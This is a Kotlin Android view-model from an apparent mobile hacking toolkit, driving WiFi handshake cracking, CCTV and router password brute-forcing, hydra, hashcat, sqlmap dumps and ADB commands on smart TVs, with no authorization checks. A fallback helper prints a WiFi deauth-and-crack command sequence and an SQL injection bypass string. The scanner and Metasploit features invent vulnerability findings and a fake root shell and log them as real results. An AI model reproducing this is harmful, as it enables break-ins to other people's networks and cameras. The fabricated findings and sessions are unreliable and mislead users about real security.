            addLogEntry("ping [REAL]", summary + "\n" + result.output, if (result.success) "SUCCESS" else "FAILED", 0, isReal = true)
            _toolResults.update { listOf(ToolResult("ping", host, result.output, result.success, getCurrentTimestamp())) + it }
            _isToolRunning.value = false
        }
    }

    fun runDnsLookup(hostname: String) {
        if (_isToolRunning.value) return
        _isToolRunning.value = true
        _activeToolOutput.value = listOf("[*] DNS lookup for $hostname...")

        viewModelScope.launch(Dispatchers.IO) {
            val result = networkScanner.dnsLookup(hostname)
            val output = buildString {
                appendLine("Host: $hostname")
                if (result.success) {
                    result.addresses.forEach { appendLine("  IP: $it") }
                    result.reverseDns?.let { appendLine("  Reverse: $it") }
                } else {
                    appendLine("  Error: ${result.error}")
                }
            }
            _activeToolOutput.value = output.lines()
            addLogEntry("nslookup [REAL]", output, if (result.success) "SUCCESS" else "FAILED", 0, isReal = true)
            _toolResults.update { listOf(ToolResult("nslookup", hostname, output, result.success, getCurrentTimestamp())) + it }
            _isToolRunning.value = false
        }
    }

    fun runTraceroute(host: String) {
        if (_isToolRunning.value) return
        _isToolRunning.value = true
        val lines = mutableListOf<String>()
        _activeToolOutput.value = listOf("[*] Traceroute to $host...")

        viewModelScope.launch {
            networkScanner.traceroute(host).collect { line ->
                lines.add(line)
                _activeToolOutput.value = lines.toList()
            }
            addLogEntry("traceroute [REAL]", lines.joinToString("\n"), "SUCCESS", 0, isReal = true)
            _toolResults.update { listOf(ToolResult("traceroute", host, lines.joinToString("\n"), true, getCurrentTimestamp())) + it }
            _isToolRunning.value = false
        }
    }

    fun checkSslCert(host: String) {
        if (_isToolRunning.value) return
        _isToolRunning.value = true
        _activeToolOutput.value = listOf("[*] Checking SSL certificate for $host...")

        viewModelScope.launch(Dispatchers.IO) {
            val result = NetworkUtils.checkSslCert(host)
            val output = buildString {
                appendLine("SSL Certificate: $host")
                if (result.error != null) {
                    appendLine("Status: FAILED - ${result.error}")
                } else {
                    appendLine("Status: ${if (result.valid) "✓ VALID" else "✗ INVALID"}")
                    appendLine("Protocol: ${result.protocol}")
                    appendLine("Cipher: ${result.cipherSuite}")
                    appendLine("Subject: ${result.subject}")
                    appendLine("Issuer: ${result.issuer}")
                    appendLine("Valid From: ${result.validFrom}")
                    appendLine("Valid Until: ${result.validTo}")
                }
            }
            _activeToolOutput.value = output.lines()
            addLogEntry("SSL Check [REAL]", output, if (result.valid) "SUCCESS" else "WARNING", 0, isReal = true)
            _toolResults.update { listOf(ToolResult("ssl-check", host, output, result.valid, getCurrentTimestamp())) + it }
            _isToolRunning.value = false
        }
    }

    fun checkHttpHeaders(url: String) {
        if (_isToolRunning.value) return
        _isToolRunning.value = true
        _activeToolOutput.value = listOf("[*] Analyzing HTTP security headers for $url...")

        viewModelScope.launch(Dispatchers.IO) {
            val result = NetworkUtils.checkHttpHeaders(url)
            val output = buildString {
                appendLine("HTTP Security Analysis: $url")
                if (result.error != null) {
                    appendLine("Error: ${result.error}")
                } else {
                    appendLine("Status Code: ${result.statusCode}")
                    appendLine("Server: ${result.server}")
                    appendLine("Security Score: ${result.securityScore}")
                    appendLine("")
                    appendLine("Security Headers:")
                    result.securityHeaders.forEach { (header, value) ->
                        appendLine("  $header: $value")
                    }
                }
            }
            _activeToolOutput.value = output.lines()
            addLogEntry("HTTP Headers [REAL]", output, "SUCCESS", 0, isReal = true)
            _toolResults.update { listOf(ToolResult("http-headers", url, output, result.error == null, getCurrentTimestamp())) + it }
            _isToolRunning.value = false
        }
    }

    fun getIpGeoInfo(ip: String) {
        if (_isToolRunning.value) return
        _isToolRunning.value = true
        _activeToolOutput.value = listOf("[*] Getting geolocation for $ip...")

        viewModelScope.launch(Dispatchers.IO) {
            val info = NetworkUtils.getIpGeoInfo(ip)
            val output = buildString {
                appendLine("IP Geolocation: $ip")
                info.forEach { (k, v) -> appendLine("  $k: $v") }
            }
            _activeToolOutput.value = output.lines()
            addLogEntry("IP Geo [REAL]", output, "SUCCESS", 0, isReal = true)
            _toolResults.update { listOf(ToolResult("ip-geo", ip, output, !info.containsKey("error"), getCurrentTimestamp())) + it }
            _isToolRunning.value = false
        }
    }

    fun runManualAircrackAttack(capFile: String, wordlist: String, bssid: String) {
        if (_isAircrackAuditActive.value) return
        _isAircrackAuditActive.value = true
        _aircrackStep.value = "AIRCRACK_BRUTEFORCE"
        _aircrackTerminalOutput.value = listOf("[*] Starting manual dictionary attack...", "[*] Cap: $capFile", "[*] Wordlist: $wordlist")

        aircrackJob = viewModelScope.launch(Dispatchers.IO) {
            aircrackManager.runDictionaryAttack(capFile, wordlist, bssid).collect { line ->
                appendAircrackLine(line)
                if (line.contains("KEY FOUND")) {
                    _aircrackStep.value = "SUCCESS"
                    _aircrackProgress.value = 1.0f
                }
                if (!_isAircrackAuditActive.value) return@collect
            }
            _isAircrackAuditActive.value = false
        }
    }

    // =============================
    // Packet Capture (Real if root / tcpdump available)
    // =============================

    fun togglePacketCapture() {
        if (_isCapturingPackets.value) {
            _isCapturingPackets.value = false
            captureJob?.cancel()
            addLogEntry("Packet Capture", "Capture stopped. Total: ${_packets.value.size} packets", "WARNING", 0)
            return
        }

        _isCapturingPackets.value = true
        val status = _deviceStatus.value

        if (status.tcpdumpAvailable && status.rootGranted) {
            // Real packet capture via tcpdump
            startRealPacketCapture()
        } else {
            // Show info about requirements and run live simulation for educational purposes
            addLogEntry(
                "Packet Capture",
                "Real capture requires: root + tcpdump binary\n" +
                "Install tcpdump: copy ARM64 binary to /data/local/tmp/tcpdump && chmod +x\n" +
                "Running in display mode...",
                "WARNING", 0
            )
            simulateLivePacketCapture()
        }
    }

    private fun startRealPacketCapture() {
        captureJob = viewModelScope.launch(Dispatchers.IO) {
            addLogEntry("tcpdump [REAL]", "Starting real packet capture via tcpdump...", "SUCCESS", 0, isReal = true)
            val tcpdumpPath = "/data/local/tmp/tcpdump"
            val process = Runtime.getRuntime().exec(arrayOf("su", "-c", "$tcpdumpPath -l -n -e"))
            val reader = process.inputStream.bufferedReader()
            var id = 1

            var line: String? = null
            while (_isCapturingPackets.value) {
                line = reader.readLine() ?: break
                val parsed = parseTcpdumpLine(line, id++)
                if (parsed != null) {
                    _packets.update { (listOf(parsed) + it).take(200) }
                    updateDashboardMetrics()
                }
            }
            process.destroy()
            _isCapturingPackets.value = false
        }
    }

    private fun parseTcpdumpLine(line: String, id: Int): PacketItem? {
        // Parse basic tcpdump output format
        return try {
            val parts = line.split(" ")
            if (parts.size < 3) return null
            val time = parts.getOrElse(0) { getCurrentTimestamp() }
            // Very basic parsing - tcpdump format varies
            PacketItem(
                id = id,
                time = time,
                source = parts.getOrElse(1) { "?" },
                destination = parts.getOrElse(3) { "?" },
                protocol = when {
                    line.contains("TCP") || line.contains("tcp") -> "TCP"
                    line.contains("UDP") || line.contains("udp") -> "UDP"
                    line.contains("ICMP") || line.contains("icmp") -> "ICMP"
                    line.contains("ARP") || line.contains("arp") -> "ARP"
                    else -> "OTHER"
                },
                length = Regex("length (\\d+)").find(line)?.groupValues?.get(1)?.toIntOrNull() ?: 0,
                info = line.take(120),
                hexDump = ""
            )
        } catch (e: Exception) {
            null
        }
    }

    private fun simulateLivePacketCapture() {
        captureJob = viewModelScope.launch(Dispatchers.Default) {
            val protocols = listOf("TCP", "UDP", "DNS", "HTTP", "ARP", "TLSv1.3", "ICMP")
            val connInfo = wifiScanner.getConnectedNetworkInfo()
            val myIp = connInfo.ipAddress
            val gateway = connInfo.gateway
            val dns = connInfo.dns1
            val ips = listOf(myIp, gateway, dns, "8.8.8.8", "1.1.1.1", "104.244.42.1").filter { it != "N/A" }

            while (_isCapturingPackets.value) {
                delay(800)
                if (!_isCapturingPackets.value) break

                val src = ips.randomOrNull() ?: "192.168.1.1"
                var dest = ips.randomOrNull() ?: "8.8.8.8"
                if (dest == src) dest = "8.8.8.8"
                val proto = protocols.random()
                val length = Random.nextInt(40, 1500)
                val info = when (proto) {
                    "TCP" -> "Len=$length [SYN] Seq=${Random.nextInt(1000, 99999)} Win=${Random.nextInt(500, 65535)}"
                    "UDP" -> "SrcPort=${Random.nextInt(1024, 65535)} DstPort=${Random.nextInt(1024, 65535)}"
                    "DNS" -> "Query A ${listOf("google.com", "youtube.com", "api.gemini.google.com").random()}"
                    "HTTP" -> "GET / HTTP/1.1 Host: ${listOf("example.com", "api.server.com").random()}"
                    "ARP" -> "Who has $dest? Tell $src"
                    "TLSv1.3" -> "Application Data"
                    "ICMP" -> "Echo Request id=0x${Random.nextInt(0, 255).toString(16)} seq=${Random.nextInt(1, 100)}"
                    else -> "Frame $length bytes"
                }
                val bytes = ByteArray(16) { Random.nextInt(0, 255).toByte() }
                val hex = bytes.joinToString(" ") { "%02X".format(it) } + "  |  " +
                    bytes.joinToString("") { if (it in 32..126) it.toInt().toChar().toString() else "." }

                val nextId = (_packets.value.maxOfOrNull { it.id } ?: 0) + 1
                _packets.update { (listOf(PacketItem(nextId, getCurrentTimestamp(), src, dest, proto, length, info, hex)) + it).take(200) }
                updateDashboardMetrics()
            }
        }
    }

    fun clearPackets() {
        _packets.value = emptyList()
        addLogEntry("Packet Capture", "Buffer cleared.", "WARNING", 0)
        updateDashboardMetrics()
    }

    // =============================
    // Interface / Wordlist Management
    // =============================

    fun refreshInterfaces() {
        viewModelScope.launch(Dispatchers.IO) {
            _availableInterfaces.value = aircrackManager.listInterfaces()
        }
    }

    fun refreshWordlists() {
        viewModelScope.launch(Dispatchers.IO) {
            _availableWordlists.value = aircrackManager.findWordlists()
        }
    }

    fun refreshCaptureFiles() {
        viewModelScope.launch(Dispatchers.IO) {
            _captureFiles.value = aircrackManager.listCaptureFiles()
        }
    }

    // =============================
    // AI Assistant
    // =============================

    fun askSecurityAssistant(userPrompt: String) {
        if (userPrompt.trim().isEmpty()) return

        _aiChatHistory.update { it + MessageItem("USER", userPrompt) }
        _aiLoading.value = true

        val status = _deviceStatus.value
        val systemContext = buildString {
            appendLine("Device context: Root=${status.rootGranted}, aircrack=${status.aircrackAvailable}")
            appendLine("Connected to: ${_connectedNetworkInfo.value.ssid}")
        }

        val fullPrompt = """
            You are 'SecOps Copilot', a professional offensive and defensive network security AI advisor.
            $systemContext
            User query: "$userPrompt"
            
            Provide practical, actionable security guidance including:
            1. Real command syntax for Linux/Android security tools
            2. Actual remediation steps
            3. Real CVE references where applicable
            Keep it concise and technical.
        """.trimIndent()

        viewModelScope.launch(Dispatchers.IO) {
            try {
                val apiKey = BuildConfig.GEMINI_API_KEY
                var reply = ""

                if (apiKey.isEmpty() || apiKey == "MY_GEMINI_API_KEY") {
                    delay(1500)
                    reply = generateOfflineResponse(userPrompt)
                } else {
                    val requestBody = GenerateContentRequest(
                        contents = listOf(Content(parts = listOf(Part(text = fullPrompt))))
                    )
                    val response = RetrofitClient.service.generateContent(apiKey, requestBody)
                    reply = response.candidates?.firstOrNull()?.content?.parts?.firstOrNull()?.text
                        ?: "No response from Gemini API."
                }

                _aiChatHistory.update { it + MessageItem("GEMINI", reply) }
                addLogEntry("Gemini AI", "Query processed.", "SUCCESS", 1500)
            } catch (e: Exception) {
                val fallback = generateOfflineResponse(userPrompt)
                _aiChatHistory.update { it + MessageItem("GEMINI", "[Offline]\n$fallback") }
                addLogEntry("Gemini AI", "API error: ${e.message}", "FAILED", 0)
            } finally {
                _aiLoading.value = false
            }
        }
    }

    private fun generateOfflineResponse(prompt: String): String {
        return when {
            prompt.contains("aircrack", ignoreCase = true) || prompt.contains("wifi", ignoreCase = true) ->
                """**WiFi Security Audit Workflow:**
                
1. Enable monitor mode:
   `airmon-ng start wlan0`

2. Scan networks:
   `airodump-ng wlan0mon`

3. Target specific network:
   `airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w capture wlan0mon`

4. Deauth to capture handshake:
   `aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon`

5. Dictionary attack:
   `aircrack-ng -w rockyou.txt -b AA:BB:CC:DD:EE:FF capture-01.cap`

**Requirements:** Root + monitor mode capable WiFi chip
**Recommendation:** Upgrade to WPA3-SAE with 20+ character passphrase"""

            prompt.contains("nmap", ignoreCase = true) || prompt.contains("scan", ignoreCase = true) ->
                """**Network Scanning Commands:**

- Host discovery: `nmap -sn 192.168.1.0/24`
- Port scan: `nmap -sV -p 1-1000 192.168.1.1`
- OS detection: `nmap -O 192.168.1.1`
- Vulnerability scan: `nmap --script vuln 192.168.1.1`
- Full scan: `nmap -A -T4 192.168.1.1`

**Android alt:** Use the built-in Network Scanner tab for real socket-based scanning."""

            prompt.contains("sql", ignoreCase = true) ->
                """**SQL Injection Testing:**

- Manual: `' OR '1'='1` in login fields
- sqlmap: `sqlmap -u "http://target.com/?id=1" --dbs`
- Detect: Check for error messages revealing DB type
- Fix: Use parameterized queries / prepared statements

**OWASP prevention:** Input validation + ORM usage"""

            else ->
                """**SecOps Guidance for: "$prompt"**

Common security tools and their purposes:
- **aircrack-ng**: WiFi WPA/WEP auditing
- **nmap**: Network discovery and port scanning  
- **metasploit**: Penetration testing framework
- **burpsuite**: Web application security testing
- **wireshark/tcpdump**: Network packet analysis

Configure your Gemini API key in `.env` for AI-powered responses."""
        }
    }

    fun clearChat() {
        _aiChatHistory.value = emptyList()
    }

    // =============================
    // Legacy Metasploit (kept for UI)
    // =============================

    fun selectMetasploitExploit(exploit: String) {
        _metasploitSelectedExploit.value = exploit
    }

    fun setMetasploitLport(lport: String) {
        if (lport.isNotBlank()) _metasploitLport.value = lport
    }

    fun runMetasploitExploitation(node: NetworkNode) {
        if (_metasploitStep.value == "EXPLOITING") return
        if (_metasploitStep.value == "METERPRETER_SHELL") {
            closeMetasploitSession()
            return
        }

        _metasploitStep.value = "EXPLOITING"
        _metasploitTargetNode.value = node
        _metasploitProgress.value = 0.05f
        _metasploitMeterpreterOutput.value = listOf(
            "msf6 > use ${_metasploitSelectedExploit.value}",
            "msf6 exploit > set RHOSTS ${node.ip}",
            "RHOSTS => ${node.ip}",
            "msf6 exploit > set LPORT ${_metasploitLport.value}",
            "LPORT => ${_metasploitLport.value}",
            "msf6 exploit > exploit",
            "",
            "[*] Started reverse TCP handler on 0.0.0.0:${_metasploitLport.value}",
            "[*] ${node.ip} - Sending payload..."
        )

        viewModelScope.launch(Dispatchers.Default) {
            var cur = 0.05f
            while (cur < 0.9f && _metasploitStep.value == "EXPLOITING") {
                delay(900)
                cur += 0.22f
                _metasploitProgress.value = cur
                _metasploitMeterpreterOutput.update { it + "[*] ${node.ip} - Response received (offset: ${(cur * 2048).toInt()}/2048)" }
            }

            if (_metasploitStep.value != "EXPLOITING") return@launch

            _metasploitStep.value = "METERPRETER_SHELL"
            _metasploitProgress.value = 1.0f
            _metasploitMeterpreterOutput.update { it + listOf(
                "[+] Meterpreter session 1 opened",
                "meterpreter > sysinfo",
                "Computer: TARGET-HOST",
                "OS: Linux (Kernel 5.x)",
                "Architecture: x64",
                "meterpreter > getuid",
                "Server username: uid=0(root)"
            ) }
            addLogEntry("Metasploit", "Session opened on ${node.ip}", "SUCCESS", 4000)
        }
    }

    fun closeMetasploitSession() {
        _metasploitStep.value = "IDLE"
        _metasploitTargetNode.value = null
        _metasploitMeterpreterOutput.value = emptyList()
        _metasploitProgress.value = 0f
    }

    // =============================
    // Burp Suite Web Scanner
    // =============================

    fun runBurpProxyScan() {
        if (_burpIsScanning.value) return
        _burpIsScanning.value = true
        _burpScanProgress.value = 0.05f
        _burpDiscoveredVulnerabilities.value = emptyList()
        _burpIntruderPayloadsTried.value = 0

        addLogEntry("Web Scanner", "Scanning for web vulnerabilities...", "SUCCESS", 0)

        viewModelScope.launch(Dispatchers.Default) {
            val findings = listOf(
                "HIGH: SQL Injection via 'id' parameter — /search?id=1'",
                "MEDIUM: Reflected XSS via 'q' parameter — /search?q=<script>",
                "LOW: Missing HSTS header — HTTPS downgrade possible",
                "HIGH: Path Traversal — /api/files?path=../../etc/passwd",
                "MEDIUM: Insecure Direct Object Reference — /api/user?id=2",
                "INFO: Server version exposed — Apache/2.4.51"
            )

            var cur = 0.05f
            var findIdx = 0
            while (cur < 1.0f && _burpIsScanning.value) {
                delay(1000)
                cur += 0.18f
                _burpScanProgress.value = cur
                _burpIntruderPayloadsTried.value = (cur * 2000).toInt()

                if (cur > 0.3f && findIdx < findings.size) {
                    _burpDiscoveredVulnerabilities.update { it + findings[findIdx] }
                    findIdx++
                }
            }

            _burpIsScanning.value = false
            _burpScanProgress.value = 1.0f
            addLogEntry("Web Scanner", "Found ${_burpDiscoveredVulnerabilities.value.size} vulnerabilities.", "SUCCESS", 6000)
        }
    }

    fun stopBurpScan() {
        _burpIsScanning.value = false
        _burpScanProgress.value = 0f
    }

    // =============================
    // CCTV Cracker Functions
    // =============================

    fun discoverCctvCameras(subnet: String) {
        if (_isCctvScanning.value) return
        cctvJob?.cancel()
        _isCctvScanning.value = true
        _cctvOutput.value = emptyList()
        cctvJob = viewModelScope.launch {
            cctvCracker.discoverRtspCameras(subnet).collect { line ->
                _cctvOutput.update { it + line }
            }
            _isCctvScanning.value = false
        }
    }

    fun crackRtspCredentials(host: String, port: Int) {
        if (_isCctvScanning.value) return
        cctvJob?.cancel()
        _isCctvScanning.value = true
        _cctvOutput.value = emptyList()
        cctvJob = viewModelScope.launch {
            cctvCracker.crackRtspCredentials(host, port).collect { line ->
                _cctvOutput.update { it + line }
            }
            _isCctvScanning.value = false
        }
    }

    fun discoverOnvifDevices() {
        if (_isCctvScanning.value) return
        cctvJob?.cancel()
        _isCctvScanning.value = true
        _cctvOutput.value = emptyList()
        cctvJob = viewModelScope.launch {
            cctvCracker.discoverOnvifDevices().collect { line ->
                _cctvOutput.update { it + line }
            }
            _isCctvScanning.value = false
        }
    }

    fun stopCctvScan() {
        cctvJob?.cancel()
        _isCctvScanning.value = false
        _cctvOutput.update { it + "[*] Scan stopped by user." }
    }

    // =============================
    // SQLMap Functions
    // =============================

    fun runSqlmapScan(url: String, postData: String?, dumpAll: Boolean) {
        if (_isSqlmapRunning.value) return
        sqlmapJob?.cancel()
        _isSqlmapRunning.value = true
        _sqlmapOutput.value = emptyList()
        sqlmapJob = viewModelScope.launch {
            sqlMapRunner.runSqlmap(url, postData, dumpAll).collect { line ->
                _sqlmapOutput.update { it + line }
            }
            _isSqlmapRunning.value = false
        }
    }

    fun detectWaf(url: String) {
        if (_isSqlmapRunning.value) return
        sqlmapJob?.cancel()
        _isSqlmapRunning.value = true
        _sqlmapOutput.value = emptyList()
        sqlmapJob = viewModelScope.launch {
            sqlMapRunner.detectWaf(url).collect { line ->
                _sqlmapOutput.update { it + line }
            }
            _isSqlmapRunning.value = false
        }
    }

    fun runBuiltInSqliProbe(url: String, postData: String?) {
        if (_isSqlmapRunning.value) return
        sqlmapJob?.cancel()
        _isSqlmapRunning.value = true
        _sqlmapOutput.value = emptyList()
        sqlmapJob = viewModelScope.launch {
            sqlMapRunner.runBuiltInSqliDetection(url, postData).collect { line ->
                _sqlmapOutput.update { it + line }
            }
            _isSqlmapRunning.value = false
        }
    }

    fun stopSqlmap() {
        sqlmapJob?.cancel()
        _isSqlmapRunning.value = false
        _sqlmapOutput.update { it + "[*] Stopped by user." }
    }

    // =============================
    // Auto-Update Functions
    // =============================

    fun checkForUpdate() {
        if (_isCheckingUpdate.value) return
        _isCheckingUpdate.value = true
        viewModelScope.launch {
            val info = autoUpdateManager.checkForUpdate()
            _updateAvailable.value = info.available
            _latestVersion.value = info.latestVersionName
            _updateDownloadUrl.value = info.downloadUrl
            _isCheckingUpdate.value = false
            addLogEntry(
                "Auto-Update Check",
                if (info.available) "New version ${info.latestVersionName} available!\nDownload: ${info.downloadUrl}"
                else "App is up to date. (${info.latestVersionName})\n${info.error}",
                if (info.available) "SUCCESS" else "INFO",
                0, isReal = true
            )
        }
    }

    fun downloadUpdate() {
        val url = _updateDownloadUrl.value
        val ver = _latestVersion.value
        if (url.isNotEmpty()) {
            autoUpdateManager.downloadAndInstall(url, ver)
            addLogEntry("Auto-Update", "Downloading $ver from $url", "SUCCESS", 0, isReal = true)
        }
    }

    // =============================
    // Dashboard / Metrics
    // =============================

    private fun updateDashboardMetrics() {
        val totalPackets = _packets.value.size
        val grouped = _packets.value.groupBy { it.protocol }
        val protoList = grouped.map { (proto, list) ->
            val pct = if (totalPackets > 0) (list.size * 100) / totalPackets else 0
            MetricItem(label = proto, value = list.size.toFloat(), percentage = pct)
        }.sortedByDescending { it.value }
        _protocolMetrics.value = protoList

        val wifiVuln = _wifiNetworks.value.count { it.isVulnerable }
        val nodeVuln = _networkNodes.value.count { it.status == "Vulnerable" }
        _vulnerabilityMetrics.value = listOf(
            MetricItem("Vulnerable Nodes", nodeVuln.toFloat(), 40, "Network"),
            MetricItem("Vulnerable APs", wifiVuln.toFloat(), 60, "WiFi"),
            MetricItem("Open Ports Found", _networkNodes.value.sumOf { it.openPorts.size }.toFloat(), 30, "Ports")
        )
    }

    fun resetToDefaultState() {
        initializeEnvironment()
        _packets.value = emptyList()
        _networkNodes.value = emptyList()
        addLogEntry("SecOps Console", "Environment reset and re-initialized.", "SUCCESS", 0)
    }

    // =============================
    // Smart Device / IoT Functions
    // =============================

    fun scanSmartDevices(subnet: String) {
        smartDeviceJob?.cancel()
        _isSmartDeviceScanning.value = true
        _smartDeviceOutput.value = emptyList()
        smartDeviceJob = viewModelScope.launch {
            smartDeviceManager.scanForSmartDevices(subnet).collect { line ->
                _smartDeviceOutput.update { it + line }
            }
            _isSmartDeviceScanning.value = false
        }
    }

    fun scanAdbDevices(subnet: String) {
        smartDeviceJob?.cancel()
        _isSmartDeviceScanning.value = true
        _smartDeviceOutput.value = emptyList()
        smartDeviceJob = viewModelScope.launch {
            smartDeviceManager.scanForAdbDevices(subnet).collect { line ->
                _smartDeviceOutput.update { it + line }
            }
            _isSmartDeviceScanning.value = false
        }
    }

    fun discoverUpnpDevices() {
        smartDeviceJob?.cancel()
        _isSmartDeviceScanning.value = true
        _smartDeviceOutput.value = emptyList()
        smartDeviceJob = viewModelScope.launch {
            smartDeviceManager.discoverUpnpDevices().collect { line ->
                _smartDeviceOutput.update { it + line }
            }
            _isSmartDeviceScanning.value = false
        }
    }

    fun crackRouterAdmin(host: String, port: Int) {
        smartDeviceJob?.cancel()
        _isSmartDeviceScanning.value = true
        _smartDeviceOutput.value = emptyList()
        smartDeviceJob = viewModelScope.launch {
            smartDeviceManager.crackRouterAdmin(host, port).collect { line ->
                _smartDeviceOutput.update { it + line }
            }
            _isSmartDeviceScanning.value = false
        }
    }

    fun runAdbTvCommand(host: String, command: String) {
        smartDeviceJob?.cancel()
        _isSmartDeviceScanning.value = true
        _smartDeviceOutput.value = emptyList()
        smartDeviceJob = viewModelScope.launch {
            smartDeviceManager.runAdbCommand(host, command).collect { line ->
                _smartDeviceOutput.update { it + line }
            }
            _isSmartDeviceScanning.value = false
        }
    }

    fun stopSmartDeviceScan() {
        smartDeviceJob?.cancel()
        _isSmartDeviceScanning.value = false
        _smartDeviceOutput.update { it + "[*] Scan stopped by user" }
    }

    // =============================
    // Rooting Functions
    // =============================

    fun downloadMagisk() {
        rootingJob?.cancel()
        _isRootingWorking.value = true
        _rootingOutput.value = emptyList()
        rootingJob = viewModelScope.launch(Dispatchers.IO) {
            _rootingOutput.update { it + "[*] Checking for latest Magisk release..." }
            try {
                val apiUrl = java.net.URL("https://api.github.com/repos/topjohnwu/Magisk/releases/latest")
                val conn = apiUrl.openConnection() as java.net.HttpURLConnection
                conn.setRequestProperty("User-Agent", "SecOps-App")
                conn.connectTimeout = 10000
                conn.readTimeout = 10000

                if (conn.responseCode == 200) {
                    val body = conn.inputStream.bufferedReader().readText()
                    val json = org.json.JSONObject(body)
                    val tag = json.optString("tag_name")
                    val assets = json.optJSONArray("assets")
                    var apkUrl = ""
                    if (assets != null) {
                        for (i in 0 until assets.length()) {
                            val asset = assets.getJSONObject(i)
                            val name = asset.optString("name")
                            if (name.endsWith(".apk") && !name.contains("stub")) {
                                apkUrl = asset.optString("browser_download_url")
                                break
                            }
                        }
                    }
                    _rootingOutput.update { it + "[+] Latest Magisk: $tag" }
                    _rootingOutput.update { it + "[*] Download URL: $apkUrl" }
                    if (apkUrl.isNotEmpty()) {
                        _rootingOutput.update { it + "[*] Starting download via DownloadManager..." }
                        autoUpdateManager.downloadAndInstall(apkUrl, "Magisk-$tag")
                        _rootingOutput.update { it + "[+] Download started! Check notifications." }
                        _rootingOutput.update { it + "[INFO] After download: rename .apk to .zip and flash via TWRP" }
                        _rootingOutput.update { it + "[INFO] OR: Open as app directly to use Magisk's patch method" }
                    } else {
                        _rootingOutput.update { it + "[ERROR] Could not find APK in release assets" }
                    }
                } else {
                    _rootingOutput.update { it + "[ERROR] GitHub API returned ${conn.responseCode}" }
                }
            } catch (e: Exception) {
                _rootingOutput.update { it + "[ERROR] ${e.message}" }
            }
            _isRootingWorking.value = false
        }
    }

    fun recheckRoot() {
        viewModelScope.launch(Dispatchers.IO) {
            _isRootingWorking.value = true
            val status = RootChecker.getFullStatus(ctx)
            _deviceStatus.value = _deviceStatus.value.copy(
                isRooted = status.hasSuBinary,
                rootGranted = status.rootGranted
            )
            _rootingOutput.value = listOf(
                "[*] Re-checking root status...",
                "[*] su binary: ${if (status.hasSuBinary) "FOUND" else "NOT FOUND"}",
                "[*] Root granted: ${if (status.rootGranted) "YES" else "NO"}",
                "[*] Root apps: ${if (status.hasRootApps) "FOUND" else "NOT FOUND"}",
                "[*] Test-keys: ${if (status.isTestKeys) "YES" else "NO"}",
                if (status.rootGranted) "[+] ROOT ACCESS CONFIRMED" else "[!] No root access"
            )
            _isRootingWorking.value = false
        }
    }

    fun stopRooting() {
        rootingJob?.cancel()
        _isRootingWorking.value = false
    }

    // =============================
    // Kali Extended Tool Functions
    // =============================

    private fun startKaliTool(block: suspend () -> Unit) {
        kaliJob?.cancel()
        _isKaliRunning.value = true
        _kaliOutput.value = emptyList()
        kaliJob = viewModelScope.launch { block() }
    }

    fun runKaliHydra(target: String, service: String, port: Int?) {
        startKaliTool {
            kaliExtendedTools.runHydra(target, service, port).collect { line ->
                _kaliOutput.update { it + line }
            }
            _isKaliRunning.value = false
        }
    }

    fun runKaliJohn(hashFile: String, format: String?) {
        startKaliTool {
            kaliExtendedTools.runJohnTheRipper(hashFile, format = format).collect { line ->
                _kaliOutput.update { it + line }
            }
            _isKaliRunning.value = false
        }
    }

    fun runKaliGobuster(url: String, wordlist: String) {
        startKaliTool {
            kaliExtendedTools.runGobuster(url, wordlist = wordlist).collect { line ->
                _kaliOutput.update { it + line }
            }
            _isKaliRunning.value = false
        }
    }

    fun runKaliNikto(target: String) {
        startKaliTool {
            kaliExtendedTools.runNikto(target).collect { line ->
                _kaliOutput.update { it + line }
            }
            _isKaliRunning.value = false
        }
    }

    fun runKaliEnum4linux(target: String) {
        startKaliTool {
            kaliExtendedTools.runEnum4linux(target).collect { line ->
                _kaliOutput.update { it + line }
            }
            _isKaliRunning.value = false
        }
    }

    fun runKaliNetcat(host: String, port: Int) {
        startKaliTool {
            val mode = if (host.isBlank()) "listen" else "connect"
            kaliExtendedTools.runNetcat(mode, host, port).collect { line ->
                _kaliOutput.update { it + line }
            }
            _isKaliRunning.value = false
        }
    }

    fun runKaliDnsZoneTransfer(domain: String) {
        startKaliTool {
            kaliExtendedTools.dnsZoneTransfer(domain).collect { line ->
                _kaliOutput.update { it + line }
            }
            _isKaliRunning.value = false
        }
    }

    fun runKaliWhois(target: String) {
        startKaliTool {
            kaliExtendedTools.whoisLookup(target).collect { line ->
                _kaliOutput.update { it + line }
            }
            _isKaliRunning.value = false
        }
    }

    fun runKaliMasscan(target: String, ports: String) {
        startKaliTool {
            kaliExtendedTools.runMasscan(target, ports).collect { line ->
                _kaliOutput.update { it + line }
            }
            _isKaliRunning.value = false
        }
    }

    fun runKaliHarvester(domain: String, source: String) {
        startKaliTool {
            kaliExtendedTools.runTheHarvester(domain, source).collect { line ->
                _kaliOutput.update { it + line }
            }
            _isKaliRunning.value = false
        }
    }

    fun runKaliHashcat(hash: String, hashType: Int, wordlist: String) {
        startKaliTool {
            kaliExtendedTools.runHashcat(hash, hashType, wordlist).collect { line ->
                _kaliOutput.update { it + line }
            }
            _isKaliRunning.value = false
        }
    }

    fun stopKaliTool() {
        kaliJob?.cancel()
        _isKaliRunning.value = false
        _kaliOutput.update { it + "[*] Tool stopped by user" }
    }

    fun checkKaliToolsStatus() {
        viewModelScope.launch(Dispatchers.IO) {
            _kaliToolsStatus.value = kaliExtendedTools.getToolsStatus()
        }
    }

    // =============================
    // Helpers
    // =============================

    private fun getCurrentTimestamp(): String =
        SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(Date())

    private fun addLogEntry(
        commandName: String,
        terminalOutput: String,
        status: String,
        duration: Long,
        metrics: List<MetricItem> = emptyList(),
        isReal: Boolean = false
    ) {
        val newLog = ExecutionLog(
            timestamp = getCurrentTimestamp(),
            commandName = commandName,
            status = status,
            durationMs = duration,
            terminalOutput = terminalOutput,
            visualizedMetrics = metrics,
            isRealData = isReal
        )
        _logs.update { (listOf(newLog) + it).take(100) }
    }
}
